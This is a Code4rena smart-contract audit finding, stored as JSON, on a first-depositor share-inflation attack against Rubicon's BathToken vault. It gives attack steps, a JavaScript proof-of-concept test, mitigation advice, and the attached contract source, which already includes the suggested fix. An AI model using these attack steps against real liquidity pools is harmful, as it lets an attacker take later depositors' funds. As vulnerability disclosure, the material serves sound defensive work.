{
  "Title": "[H-04] First depositor can break minting of shares",
  "Content": "# Lines of code\n\nhttps://github.com/RubiconDeFi/rubicon-protocol-v1/blob/master/contracts/rubiconPools/BathToken.sol#L569-L571\n\n\n# Vulnerability details\n\n## Impact\nThe attack vector and impact is the same as [TOB-YEARN-003](https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large â€œdonationâ€.\n\n## Proof of Concept\nIn `BathToken.sol:569-571`, the allocation of shares is calculated as follows:\n```js\n(totalSupply == 0) ? shares = assets : shares = (\n    assets.mul(totalSupply)\n).div(_pool);\n```\n\nAn early attacker can exploit this by:\n* Attacker calls `openBathTokenSpawnAndSignal()` with `initialLiquidityNew = 1`, creating a new bath token with `totalSupply = 1`\n* Attacker transfers a large amount of underlying tokens to the bath token contract, such as `1000000`\n* Using `deposit()`, a victim deposits an amount less than `1000000`, such as `1000`:\n    * `assets = 1000`\n    * `(assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001`, which would round down to `0`\n    * Thus, the victim receives no shares in return for his deposit\n\nTo avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.\n\n```js\nit(\"Victim receives 0 shares\", async () => {\n    // 1. Attacker deposits 1 testCoin first when creating the liquidity pool\n    const initialLiquidityNew = 1;\n    const initialLiquidityExistingBathToken = ethers.utils.parseUnits(\"100\", decimals);\n    \n    // Approve DAI and testCoin for bathHouseInstance\n    await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {\n        from: attacker,\n    });\n    await DAIInstance.approve(\n        bathHouseInstance.address,\n        initialLiquidityExistingBathToken,\n        { from: attacker }\n    );\n\n    // Call open creation function, attacker deposits only 1 testCoin\n    const desiredPairedAsset = await DAIInstance.address;\n    await bathHouseInstance.openBathTokenSpawnAndSignal(\n        await testCoin.address,\n        initialLiquidityNew,\n        desiredPairedAsset,\n        initialLiquidityExistingBathToken,\n        { from: attacker }\n    );\n    \n    // Retrieve resulting bathToken address\n    const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);\n    const _newBathToken = await BathToken.at(newbathTokenAddress);\n\n    // 2. Attacker deposits large amount of testCoin into liquidity pool\n    let attackerAmt = ethers.utils.parseUnits(\"1000000\", decimals);\n    await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});\n    await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});\n\n    // 3. Victim deposits a smaller amount of testCoin, receives 0 shares\n    // In this case, we use (1 million - 1) testCoin\n    let victimAmt = ethers.utils.parseUnits(\"999999\", decimals);\n    await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});\n    await _newBathToken.deposit(victimAmt, victim, {from: victim});\n    \n    assert.equal(await _newBathToken.balanceOf(victim), 0);\n});\n```\n\n## Recommended Mitigation Steps\n* [Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when `totalSupply() == 0`, send the first min liquidity LP tokens to the zero address to enable share dilution.\n* In `_deposit()`, ensure the number of shares to be minted is non-zero:  \n`require(shares != 0, \"No shares minted\");`\n\n\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/contests/2022-05-rubicon-contest",
  "Code": [
    {
      "filename": "contracts/rubiconPools/BathToken.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\n/// @author Rubicon DeFi Inc. - bghughes.eth\n/// @notice This contract represents a single-asset liquidity pool for Rubicon Pools\n/// @notice Any user can deposit assets into this pool and earn yield from successful strategist market making with their liquidity\n/// @notice This contract looks to both BathPairs and the BathHouse as its admin\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n// import \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\nimport \"../interfaces/IBathHouse.sol\";\nimport \"../interfaces/IRubiconMarket.sol\";\nimport \"../interfaces/IBathBuddy.sol\";\n\ncontract BathToken {\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n\n    /// *** Storage Variables ***\n\n    /// @notice The initialization status of the Bath Token\n    bool public initialized;\n\n    /// @notice  ** ERC-20 **\n    string public symbol;\n    string public name;\n    uint8 public decimals;\n\n    /// @notice The RubiconMarket.sol instance that all pool liquidity is intially directed to as market-making offers\n    address public RubiconMarketAddress;\n\n    /// @notice The Bath House admin of the Bath Token\n    address public bathHouse;\n\n    /// @notice The withdrawal fee recipient, typically the Bath Token itself\n    address public feeTo;\n\n    /// @notice The underlying ERC-20 token which is the core asset of the Bath Token vault\n    IERC20 public underlyingToken;\n\n    /// @notice The basis point fee rate that is paid on withdrawing the underlyingToken and bonusTokens\n    uint256 public feeBPS;\n\n    /// @notice ** ERC-20 **\n    uint256 public totalSupply;\n\n    /// @notice The amount of underlying deposits that are outstanding attempting market-making on the order book for yield\n    /// @dev quantity of underlyingToken that is in the orderbook that the pool still has a claim on\n    /// @dev The underlyingToken is effectively mark-to-marketed when it enters the book and it could be returned at a loss due to poor strategist performance\n    /// @dev outstandingAmount is NOT inclusive of any non-underlyingToken assets sitting on the Bath Tokens that have filled to here and are awaiting rebalancing to the underlyingToken by strategists\n    uint256 public outstandingAmount;\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress ðŸ“ˆ\n    /// @dev Keeping deprecated variables maintains consistent network-agnostic contract abis when moving to new chains and versions\n    uint256[] deprecatedStorageArray; // Kept in to avoid storage collision bathTokens that are proxy upgraded\n\n    /// @dev Intentionally unused DEPRECATED STORAGE VARIABLE to maintain contiguous state on proxy-wrapped contracts. Consider it a beautiful scar of incremental progress ðŸ“ˆ\n    mapping(uint256 => uint256) deprecatedMapping; // Kept in to avoid storage collision on bathTokens that are upgraded\n    // *******************************************\n\n    /// @notice  ** ERC-20 **\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    /// @notice EIP-2612\n    bytes32 public DOMAIN_SEPARATOR;\n\n    /// @notice EIP-2612\n    /// @dev keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH =\n        0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n\n    /// @notice EIP-2612\n    mapping(address => uint256) public nonces;\n\n    /// @notice Array of Bonus ERC-20 tokens that are given as liquidity incentives to pool withdrawers\n    address[] public bonusTokens;\n\n    /// @notice Address of the OZ Vesting Wallet which acts as means to vest bonusToken incentives to pool HODLers\n    IBathBuddy public bathBuddy;\n\n    /// @dev Reentrancy protection\n    bool locked;\n\n    /// *** Events ***\n\n    /// @notice ** ERC-20 **\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    /// @notice ** ERC-20 **\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Time of Bath Token instantiation\n    event LogInit(uint256 timeOfInit);\n\n    /// @notice Log details about a pool deposit\n    event LogDeposit(\n        uint256 depositedAmt,\n        IERC20 asset,\n        uint256 sharesReceived,\n        address depositor,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool withdraw\n    event LogWithdraw(\n        uint256 amountWithdrawn,\n        IERC20 asset,\n        uint256 sharesWithdrawn,\n        address withdrawer,\n        uint256 fee,\n        address feeTo,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool rebalance\n    event LogRebalance(\n        IERC20 pool_asset,\n        address destination,\n        IERC20 transferAsset,\n        uint256 rebalAmt,\n        uint256 stratReward,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order canceled in the Rubicon Market book\n    event LogPoolCancel(\n        uint256 orderId,\n        IERC20 pool_asset,\n        uint256 outstandingAmountToCancel,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log details about a pool order placed in the Rubicon Market book\n    event LogPoolOffer(\n        uint256 id,\n        IERC20 pool_asset,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice Log the credit to outstanding amount for funds that have been filled market-making\n    event LogRemoveFilledTradeAmount(\n        IERC20 pool_asset,\n        uint256 fillAmount,\n        uint256 underlyingBalance,\n        uint256 outstandingAmount,\n        uint256 totalSupply\n    );\n\n    /// @notice * EIP 4626 *\n    event Deposit(\n        address indexed caller,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// @notice * EIP 4626 *\n    event Withdraw(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares\n    );\n\n    /// @notice Log bonus token reward event\n    event LogClaimBonusTokn(\n        address indexed caller,\n        address indexed receiver,\n        address indexed owner,\n        uint256 assets,\n        uint256 shares,\n        IERC20 bonusToken\n    );\n\n    /// *** Constructor ***\n\n    /// @notice Proxy-safe initialization of storage; the constructor\n    function initialize(\n        ERC20 token,\n        address market,\n        address _feeTo\n    ) external nonReentrant {\n        require(!initialized);\n        string memory _symbol = string(\n            abi.encodePacked((\"bath\"), token.symbol())\n        );\n        symbol = _symbol;\n        underlyingToken = token;\n        RubiconMarketAddress = market;\n        bathHouse = msg.sender; //NOTE: assumed admin is creator on BathHouse\n\n        name = string(abi.encodePacked(_symbol, (\" v1\")));\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n        decimals = token.decimals(); // v1 Change - 4626 Adherence\n\n        // Complete constract instantiation via CEI pattern\n        initialized = true;\n\n        // Add infinite approval of Rubicon Market for this asset\n        IERC20(address(token)).approve(RubiconMarketAddress, 2**256 - 1);\n        emit LogInit(block.timestamp);\n\n        feeTo = address(this); //This contract is the fee recipient, rewarding HODLers\n        feeBPS = 3; //Fee set to 3 BPS initially\n    }\n\n    /// *** Modifiers ***\n\n    modifier onlyPair() {\n        require(\n            IBathHouse(bathHouse).isApprovedPair(msg.sender) == true,\n            \"not an approved pair - bathToken\"\n        );\n        _;\n    }\n\n    modifier onlyBathHouse() {\n        require(\n            msg.sender == bathHouse,\n            \"caller is not bathHouse - BathToken.sol\"\n        );\n        _;\n    }\n\n    /// @dev nonReentrant\n    modifier nonReentrant() {\n        require(!locked);\n        locked = true;\n        _;\n        locked = false;\n    }\n\n    /// *** External Functions - Only Bath House / Admin ***\n\n    /// @notice Admin-only function to set a Bath Token's market address\n    function setMarket(address newRubiconMarket) external onlyBathHouse {\n        RubiconMarketAddress = newRubiconMarket;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathHouse(address newBathHouse) external onlyBathHouse {\n        bathHouse = newBathHouse;\n    }\n\n    /// @notice Admin-only function to approve Bath Token's RubiconMarketAddress with the maximum integer value (infinite approval)\n    function approveMarket() external onlyBathHouse {\n        underlyingToken.approve(RubiconMarketAddress, 2**256 - 1);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setFeeBPS(uint256 _feeBPS) external onlyBathHouse {\n        require(_feeBPS <= 300, \"Fee can never exceed 300 bps\");\n        feeBPS = _feeBPS;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient, typically the pool itself\n    function setFeeTo(address _feeTo) external onlyBathHouse {\n        feeTo = _feeTo;\n    }\n\n    /// @notice Admin-only function to set THE BathBuddy which holds all ERC20 rewards\n    function setBathBuddy(address newBuddy) external onlyBathHouse {\n        bathBuddy = IBathBuddy(newBuddy);\n    }\n\n    /// @notice Admin-only function to add a bonus token to bonusTokens for pool incentives\n    function setBonusToken(address newBonusERC20) external onlyBathHouse {\n        bonusTokens.push(newBonusERC20);\n        require(bonusTokens.length < 5, \"too many tokens in this party\");\n    }\n\n    /// *** External Functions - Only Approved Bath Pair / Strategist Contract ***\n\n    /// ** Rubicon Market Functions **\n\n    /// @notice The function for a strategist to cancel an outstanding Market Offer\n    function cancel(uint256 id, uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        IRubiconMarket(RubiconMarketAddress).cancel(id);\n\n        emit LogPoolCancel(\n            id,\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice A function called by BathPair to maintain proper accounting of outstandingAmount\n    function removeFilledTradeAmount(uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        emit LogRemoveFilledTradeAmount(\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice The function that places a bid and/or ask in the orderbook for a given pair from this pool\n    function placeOffer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) external onlyPair returns (uint256) {\n        // Place an offer in RubiconMarket\n        // If incomplete offer return 0\n        if (\n            pay_amt == 0 ||\n            pay_gem == ERC20(0) ||\n            buy_amt == 0 ||\n            buy_gem == ERC20(0)\n        ) {\n            return 0;\n        }\n\n        uint256 id = IRubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            false\n        );\n        outstandingAmount = outstandingAmount.add(pay_amt);\n\n        emit LogPoolOffer(\n            id,\n            IERC20(underlyingToken),\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        return (id);\n    }\n\n    /// @notice This function returns filled orders to the correct liquidity pool and sends strategist rewards to the Bath Pair\n    /// @dev Sends non-underlyingToken fill elsewhere in the Pools system, typically it's sister asset within a trading pair (e.g. ETH-USDC)\n    /// @dev Strategists presently accrue rewards in the filled asset not underlyingToken\n    function rebalance(\n        address destination,\n        address filledAssetToRebalance, /* sister or fill asset */\n        uint256 stratProportion,\n        uint256 rebalAmt\n    ) external onlyPair {\n        require(filledAssetToRebalance != asset(), \"must not be underlying\");\n        uint256 stratReward = (stratProportion.mul(rebalAmt)).div(10000);\n        IERC20(filledAssetToRebalance).safeTransfer(\n            destination,\n            rebalAmt.sub(stratReward)\n        );\n        IERC20(filledAssetToRebalance).safeTransfer(msg.sender, stratReward);\n\n        emit LogRebalance(\n            IERC20(underlyingToken),\n            destination,\n            IERC20(filledAssetToRebalance),\n            rebalAmt,\n            stratReward,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// *** EIP 4626 Implementation ***\n    // https://eips.ethereum.org/EIPS/eip-4626#specification\n\n    /// @notice Withdraw your bathTokens for the underlyingToken\n    function withdraw(uint256 _shares)\n        external\n        nonReentrant\n        returns (uint256 amountWithdrawn)\n    {\n        return _withdraw(_shares, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function asset() public view returns (address assetTokenAddress) {\n        assetTokenAddress = address(underlyingToken);\n    }\n\n    /// @notice * EIP 4626 *\n    function totalAssets() public view returns (uint256 totalManagedAssets) {\n        return underlyingBalance();\n    }\n\n    /// @notice * EIP 4626 *\n    function convertToShares(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // Note: Inflationary tokens may affect this logic\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(totalAssets());\n    }\n\n    // Note: MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// @notice * EIP 4626 *\n    function convertToAssets(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        assets = (totalAssets().mul(shares)).div(totalSupply);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxDeposit(address receiver)\n        public\n        pure\n        returns (uint256 maxAssets)\n    {\n        maxAssets = 2**256 - 1; // No limit on deposits in current implementation  = Max UINT\n    }\n\n    /// @notice * EIP 4626 *\n    function previewDeposit(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // The exact same logic is used, no deposit fee - only difference is deflationary token check (rare condition and probably redundant)\n        shares = convertToShares(assets);\n    }\n\n    // Single asset override to reflect old functionality\n    function deposit(uint256 assets)\n        public\n        nonReentrant\n        returns (uint256 shares)\n    {\n        // Note: msg.sender is the same throughout the same contract context\n        return _deposit(assets, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function deposit(uint256 assets, address receiver)\n        public\n        nonReentrant\n        returns (uint256 shares)\n    {\n        return _deposit(assets, receiver);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxMint(address receiver) public pure returns (uint256 maxShares) {\n        maxShares = 2**256 - 1; // No limit on shares that could be created via deposit in current implementation - Max UINT\n    }\n\n    // Given I want these shares, how much do I have to deposit\n    /// @notice * EIP 4626 *\n    function previewMint(uint256 shares) public view returns (uint256 assets) {\n        (totalSupply == 0) ? assets = shares : assets = (\n            shares.mul(totalAssets())\n        ).div(totalSupply);\n    }\n\n    // Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.\n    /// @notice * EIP 4626 *\n    function mint(uint256 shares, address receiver)\n        public\n        nonReentrant\n        returns (uint256 assets)\n    {\n        assets = previewMint(shares);\n        uint256 _shares = _deposit(assets, receiver);\n        require(_shares == shares, \"did not mint expected share count\");\n    }\n\n    // A user can withdraw whatever they hold\n    /// @notice * EIP 4626 *\n    function maxWithdraw(address owner)\n        public\n        view\n        returns (uint256 maxAssets)\n    {\n        if (totalSupply == 0) {\n            maxAssets = 0;\n        } else {\n            uint256 ownerShares = balanceOf[owner];\n            maxAssets = convertToAssets(ownerShares);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function previewWithdraw(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        if (totalSupply == 0) {\n            shares = 0;\n        } else {\n            shares = convertToShares(\n                assets.add(assets.mul(feeBPS).div((uint256(10000).sub(feeBPS))))\n            );\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public nonReentrant returns (uint256 shares) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        uint256 expectedShares = previewWithdraw(assets);\n        uint256 assetsReceived = _withdraw(expectedShares, receiver);\n        require(\n            assetsReceived >= assets,\n            \"You cannot withdraw the amount of assets you expected\"\n        );\n        shares = expectedShares;\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function maxRedeem(address owner) public view returns (uint256 maxShares) {\n        return balanceOf[owner];\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function previewRedeem(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        uint256 r = (underlyingBalance().mul(shares)).div(totalSupply);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        assets = r.sub(_fee);\n    }\n\n    /// @notice * EIP 4626 *\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public nonReentrant returns (uint256 assets) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        assets = _withdraw(shares, receiver);\n    }\n\n    /// *** Internal Functions ***\n\n    /// @notice Deposit assets for the user and mint Bath Token shares to receiver\n    function _deposit(uint256 assets, address receiver)\n        internal\n        returns (uint256 shares)\n    {\n        uint256 _pool = underlyingBalance();\n        uint256 _before = underlyingToken.balanceOf(address(this));\n\n        // **Assume caller is depositor**\n        underlyingToken.safeTransferFrom(msg.sender, address(this), assets);\n        uint256 _after = underlyingToken.balanceOf(address(this));\n        assets = _after.sub(_before); // Additional check for deflationary tokens\n\n        if (totalSupply == 0) {\n            uint256 minLiquidityShare = 10**3;\n            shares = assets.sub(minLiquidityShare);\n            // Handle protecting from an initial supply spoof attack\n            _mint(address(0), (minLiquidityShare));\n        } else {\n            shares = (assets.mul(totalSupply)).div(_pool);\n        }\n\n        // Send shares to designated target\n        _mint(receiver, shares);\n\n        require(shares != 0, \"No shares minted\");\n        emit LogDeposit(\n            assets,\n            underlyingToken,\n            shares,\n            msg.sender,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Deposit(msg.sender, msg.sender, assets, shares);\n    }\n\n    /// @dev assumes that msg.sender is the shareholder\n    /// @notice Withdraw share for the user and send underlyingToken to receiver with any accrued yield and incentive tokens\n    function _withdraw(uint256 _shares, address receiver)\n        internal\n        returns (uint256 amountWithdrawn)\n    {\n        uint256 r = (underlyingBalance().mul(_shares)).div(totalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.safeTransfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.safeTransfer(receiver, amountWithdrawn);\n\n        emit LogWithdraw(\n            amountWithdrawn,\n            underlyingToken,\n            _shares,\n            msg.sender,\n            _fee,\n            feeTo,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Withdraw(\n            msg.sender,\n            receiver,\n            msg.sender,\n            amountWithdrawn,\n            _shares\n        );\n    }\n\n    // // User can recieve the awards they have accrued on BathBuddy\n    function getBonusTokenReward(address rewardToken) public {\n        IBathBuddy(bathBuddy).getReward(IERC20(rewardToken), msg.sender);\n    }\n\n    // // User can recieve the awards they have accrued on BathBuddy\n    function getAllBonusTokenReward() public {\n        distributeBonusTokenRewards(msg.sender);\n    }\n\n    /// Must allow the custom receiver option of the 4626 withdraw call path\n    /// @notice Function to distibute non-underlyingToken Bath Token incentives to pool withdrawers\n    /// @dev Note that bonusTokens adhere to the same feeTo and feeBPS pattern\n    /// @dev Note the edge case in which the bonus token is the underlyingToken, here we simply release() to the pool and skip\n    function distributeBonusTokenRewards(address receiver) internal {\n        // Note, receiver must be owner <- enforced in the two withdraw entry paths\n        // require(msg.sender == receiver, \"You cannot claim someone else`s bonus tokens\");\n        // Verbose check:\n        // require(initialTotalSupply == sharesWithdrawn + totalSupply);\n        if (bonusTokens.length > 0) {\n            for (uint256 index = 0; index < bonusTokens.length; index++) {\n                IERC20 token = IERC20(bonusTokens[index]);\n                require(address(token) != address(0), \"bad bonus token\");\n                // Hit BathBuddy permissioned, nonReentrant function to handle paying out\n                IBathBuddy(bathBuddy).getReward(token, receiver);\n\n                emit LogClaimBonusTokn(\n                    msg.sender,\n                    receiver,\n                    msg.sender,\n                    IBathBuddy(bathBuddy).earned(msg.sender, address(token)),\n                    balanceOf[msg.sender],\n                    token\n                );\n            }\n        }\n    }\n\n    /// *** ERC - 20 Standard ***\n\n    function _mint(address to, uint256 value) internal {\n        // Used for bonus token accounting\n        distributeBonusTokenRewards(to);\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    }\n\n    function _burn(address from, uint256 value) internal {\n        // Used for bonus token accounting\n        distributeBonusTokenRewards(from);\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) private {\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) private {\n        // Bonus tokens\n        distributeBonusTokenRewards(from);\n        balanceOf[from] = balanceOf[from].sub(value);\n        // Bonus tokens\n        distributeBonusTokenRewards(to);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != uint256(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /// @notice EIP 2612\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        require(deadline >= block.timestamp, \"bathToken: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) && recoveredAddress == owner,\n            \"bathToken: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    }\n\n    /// *** View Functions ***\n\n    /// @notice The underlying ERC-20 that this bathToken handles\n    function underlyingERC20() external view returns (address) {\n        return address(underlyingToken);\n    }\n\n    /// @notice The best-guess total claim on assets the Bath Token has\n    /// @dev returns the amount of underlying ERC20 tokens in this pool in addition to any tokens that are outstanding in the Rubicon order book seeking market-making yield (outstandingAmount)\n    function underlyingBalance() public view returns (uint256) {\n        uint256 _pool = IERC20(underlyingToken).balanceOf(address(this));\n        return _pool.add(outstandingAmount);\n    }\n}"
    }
  ]
}